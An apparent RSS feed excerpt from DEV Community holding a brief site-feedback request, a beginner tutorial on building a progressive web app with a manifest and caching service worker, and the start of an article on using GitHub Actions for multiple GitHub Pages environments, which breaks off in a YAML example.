<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Please give me advices how to improve site</title>
      <author>spoilt</author>
      <pubDate>Fri, 25 Jun 2021 22:10:07 +0000</pubDate>
      <link>https://dev.to/devhelper/please-give-me-advices-how-to-improve-site-396k</link>
      <guid>https://dev.to/devhelper/please-give-me-advices-how-to-improve-site-396k</guid>
      <description>&lt;p&gt;Please give me advices how to improve site &lt;a href="http://bit.ly/2nZoCig"&gt;http://bit.ly/2nZoCig&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks in advance!&lt;/p&gt;

</description>
      <category>html</category>
      <category>css3</category>
      <category>javascript</category>
      <category>wordpress</category>
    </item>
    <item>
      <title>How to make a PWA</title>
      <author>TheYoungestCoder</author>
      <pubDate>Fri, 25 Jun 2021 21:56:31 +0000</pubDate>
      <link>https://dev.to/theyoungestcoder/how-to-make-a-pwa-4m4n</link>
      <guid>https://dev.to/theyoungestcoder/how-to-make-a-pwa-4m4n</guid>
      <description>&lt;p&gt;This is part 3 of "Getting a 100% score in lighthouse". In this article I'll show you how to create PWA. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#get-started"&gt;
  &lt;/a&gt;
  Get started
&lt;/h2&gt;

&lt;p&gt;To create a PWA (progressive web app) you need to use a webmanifest. The first thing you need to do is create a file called &lt;code&gt;manifest.json&lt;/code&gt; and include this snippet inside the head of &lt;code&gt;index.html&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"manifest"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"manifest.json"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Since &lt;code&gt;manifest.json&lt;/code&gt; has many required properties to get your PWA working. I'll explain every one in-depth and how to implement them&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-name-endraw-raw-shortname-endraw-and-raw-description-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;short_name&lt;/code&gt;, and &lt;code&gt;description&lt;/code&gt;
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;short_name&lt;/code&gt; is what the user sees on their home screen. &lt;/li&gt;
&lt;li&gt;
&lt;code&gt;name&lt;/code&gt; and &lt;code&gt;description&lt;/code&gt; is what the user sees when installing the PWA&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#-raw-icons-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;icons&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;When a user installs your PWA, it uses an &lt;strong&gt;array&lt;/strong&gt; of icons to display on the home screen. Each icon is an object in which you need to specify the &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;src&lt;/code&gt;, and &lt;code&gt;sizes&lt;/code&gt; of each icon &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-starturl-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;start_url&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;This is the URL that is used when the user opens your app. It's typically &lt;code&gt;/&lt;/code&gt; or &lt;code&gt;index.html&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-themecolor-endraw-and-raw-backgroundcolor-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;theme_color&lt;/code&gt; and &lt;code&gt;background_color&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;This is pretty self-explanatory. It is worth noting that you have to use the HEX format.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-display-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;display&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;It describes how it's shown when your app is launched&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;fullscreen — the app runs in a fullscreen window&lt;/li&gt;
&lt;li&gt;standalone — the app runs in it's own window but still has a URL bar&lt;/li&gt;
&lt;li&gt;browser — the app runs in the browser&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#-raw-splashscreen-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;splash_screen&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;The splash screen is the image that appears when your app is launched. It is just in image so it requires &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;src&lt;/code&gt; and &lt;code&gt;sizes&lt;/code&gt; similar to an icon. &lt;/p&gt;

&lt;p&gt;Now that you know all the properties, here's an example for a news app webmanifest.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Newsella&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;short_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;News&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;start_url&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;theme_color&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#fff&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;background_color&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#fff&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;display&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;standalone&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;description&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;One place for all of your news&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;icons&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;logo.png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;sizes&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;560xx560&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;image/png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;splash_screen&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;splash_screen.png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;sizes&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;800x100&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;image/png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: iOS does not use the icons property and instead uses &lt;code&gt;&amp;lt;link rel="apple-touch-icon" href="your icon"&amp;gt;&lt;/code&gt;. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#service-workers"&gt;
  &lt;/a&gt;
  Service workers
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Service workers enable applications to control network requests, cache those requests to improve performance, and provide offline access to cached content.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To get a service worker setup you first need to create a file called &lt;code&gt;service-worker.js&lt;/code&gt;. Then, insert this snippet in your &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag inside &lt;code&gt;index.html&lt;/code&gt; to register the service worker.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;serviceWorker&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;navigator&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;navigator&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;serviceWorker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;service-worker.js&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This next snippet creates an array of files and caches them once it's installed. This allows your PWA to be usable offline. Include it in &lt;code&gt;service-worker.js&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cacheName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;app&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;filesToCache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;somefile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;anotherfile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;install&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;waitUntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cacheName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filesToCache&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;files cached&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;})()&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next, what you need to do is intercept any requests. If it's cached, simply return the already-cached value. Otherwise, fetch the file, then cache it. It's expressed with this code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;fetch&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;respondWith&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// check if it's already cached&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cachedFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;requesting resource:&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cachedFile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;cachedFile&lt;/span&gt;

        &lt;span class="c1"&gt;// if not, fetch then cache&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cacheName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;caching resource:&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;clone&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;
    &lt;span class="p"&gt;})())&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#youre-done"&gt;
  &lt;/a&gt;
  You're done!
&lt;/h2&gt;

&lt;p&gt;You've successfully made a PWA! If you need help, I included some debugging tips below. If that didn't solve the issue, post the error in the comments. Thanks for reading, I hope this helped you.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging"&gt;
  &lt;/a&gt;
  Debugging
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Failed to execute 'Cache' on 'addAll'&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This occurs when a file attempts to be cached that doesn't exist. Make sure that the files have the correct path in the &lt;code&gt;filesToCache&lt;/code&gt; array.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Service Worker Registration Failed&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This happens when &lt;code&gt;service-worker.js&lt;/code&gt; doesn't exist.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Manifest property 'start_url' ignored, url is invalid&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Make sure that it points to the location of the actual HTML file for your app.&lt;/p&gt;

</description>
      <category>webdev</category>
    </item>
    <item>
      <title>Multiple Environments With GitHub Pages</title>
      <author>mkt</author>
      <pubDate>Fri, 25 Jun 2021 21:05:46 +0000</pubDate>
      <link>https://dev.to/mktcode/multiple-environments-with-github-pages-53me</link>
      <guid>https://dev.to/mktcode/multiple-environments-with-github-pages-53me</guid>
      <description>&lt;h1&gt;
  &lt;a href="#or-when-youre-working-on-a-static-site-and-github-pages-feels-like-the-perfect-hosting-solution-since-you-like-having-everything-in-one-place-and-then-you-realize-you-need-an-additional-environment-but-you-still-dont-want-to-use-anything-but-github-heres-what-you-can-do"&gt;
  &lt;/a&gt;
  or... When you’re working on a static site and GitHub Pages feels like the perfect hosting solution, since you like having everything in one place and then you realize you need an additional environment but you still don’t want to use anything but GitHub… Here’s what you can do.
&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Qmnzsg55--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AIN4wR0kIkrFKn6zg9aZgCA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Qmnzsg55--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AIN4wR0kIkrFKn6zg9aZgCA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This is a “special needs” article but also a general introduction to GitHub Actions.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Since the advent of Single Page Applications the requirements for hosting have been reduced to a minimum. Anything that can serve a static HTML file will do the job just fine and the browser, bombarded with Javascript, does the heavy lifting. High availability and security is a totally different topic of course but in this case I believe GitHub has you covered.&lt;/p&gt;

&lt;p&gt;With &lt;a href="https://pages.github.com"&gt;Pages&lt;/a&gt; GitHub offers a very convenient service for hosting such an app. You push to your repository and GitHub updates the deployment for you. You even get a nice subdomain like &lt;code&gt;username.github.io&lt;/code&gt; or you can connect your own domain. There’s just one downside.&lt;/p&gt;

&lt;p&gt;If your project is not just a literally very static website but an actual “app” and you are working together with other people, you probably want to have multiple deployments, like a development and a staging environment. The problem is… A repository on GitHub can only have a single GitHub Page instance and you probably don’t want to maintain a mirror repository for each of your environments, so you’ll end up using an external hosting service and then you start questioning GitHub Pages as your preferred hosting solution all together. In this article I will show you what I did to “stay on GitHub“.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#github-actions-amp-workflows"&gt;
  &lt;/a&gt;
  GitHub Actions &amp;amp; Workflows
&lt;/h3&gt;

&lt;p&gt;Not only does GitHub offer free hosting but also free and pretty flexible and powerful workflow automation with &lt;a href="https://github.com/features/actions"&gt;GitHub Actions&lt;/a&gt;. If you are not already familiar with CI/CD and GitHub Actions in particular, I recommend you to change that asap. I ignored this topic for far too long but now I’m a huge fan. It simply gives you superpowers.&lt;/p&gt;

&lt;p&gt;I’ll try to give you a brief but effective introduction:&lt;/p&gt;

&lt;p&gt;GitHub runs &lt;a href="https://github.com/actions/virtual-environments"&gt;virtual machines&lt;/a&gt; that act as task runners for your projects. Those tasks can either run on a schedule, as a cronjob, or get &lt;a href="https://docs.github.com/en/actions/reference/events-that-trigger-workflows"&gt;triggered by events&lt;/a&gt; that occur on GitHub, like pushing commits to a branch, opening or closing issues or commenting on them, to name some common ones. These tasks can be comprised of multiple steps that can be chained together and depend on one another, hence the term &lt;em&gt;Workflows&lt;/em&gt;. The terminology is the following: &lt;em&gt;Workflows&lt;/em&gt; have one or more &lt;em&gt;jobs&lt;/em&gt;, each with one or more &lt;em&gt;steps&lt;/em&gt;, which can make use of an &lt;em&gt;action&lt;/em&gt;, which can have &lt;em&gt;inputs&lt;/em&gt; and &lt;em&gt;outputs&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Actions are the “atoms” a workflow is made of, so to say. An action is a repository on GitHub, containing an &lt;code&gt;action.yml&lt;/code&gt; file, describing its inputs and outputs. That means an action can basically do anything you want. It is worth mentioning though, that you actually don’t even have to use actions in your workflows at all. You can also just run arbitrary commands on the operating system the workflow runs on and sometimes that is all you need. You can think of GitHub Workflows simply as… “executing stuff” on a virtual machine that GitHub spawns for you on demand.&lt;/p&gt;

&lt;p&gt;To add a new workflow you need to add a YAML configuration file inside the &lt;code&gt;.github/workflows&lt;/code&gt; directory of your repository. GitHub will automatically pick that up and run it according to the terms you configure. Here’s a &lt;code&gt;hello-world.yml&lt;/code&gt; that shows probably the most simple and useless workflow possible:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Hello World&lt;/span&gt;  
&lt;span class="na"&gt;on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;schedule&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
